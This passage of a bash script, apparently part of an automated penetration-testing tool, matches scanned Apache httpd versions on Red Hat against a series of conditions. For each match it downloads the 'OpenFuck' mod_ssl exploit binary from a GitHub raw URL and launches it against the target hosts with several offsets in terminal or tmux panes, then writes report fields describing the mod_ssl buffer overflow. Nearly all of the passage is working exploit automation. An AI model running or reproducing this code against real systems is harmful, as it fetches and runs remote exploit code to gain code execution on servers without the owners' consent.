						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.4" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.4" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x49 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x49 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.1.3" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.1.3" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x48 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x48 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.12" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.12" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x44 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x45 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x46 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x56 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x57 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x58 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5e $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5f $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x44 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x45 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x46 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x56 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x57 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x58 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5e $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5f $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.20" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.20" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6b $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6a $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6b $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6a $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.22" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.22" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6c $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x61 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x62 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x66 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x67 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x68 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6c $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x61 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x62 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x66 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x67 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x68 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.23" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.23" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x73 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x59 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5a $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5b $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x74 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x74 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x59 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5a $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5b $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x73 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.9" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.9" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x53 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x52 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x53 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.19" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.19" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
 
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x64 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x65 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x64 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x65 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.24" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.24" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
 
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6d $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x51 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6d $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x51 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/2.0.40" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "2.0.40" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
 
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x78 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x78 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.26" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.26" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
 
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6e $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6f $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x70 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x71 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x55 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5c $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6e $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x6f $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x70 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x71 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x55 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5c $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.27" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.27" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
 
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x72 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x75 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x76 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x77 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5d $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x63 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x69 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x72 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x75 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x76 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x77 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x5d $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x63 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x69 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
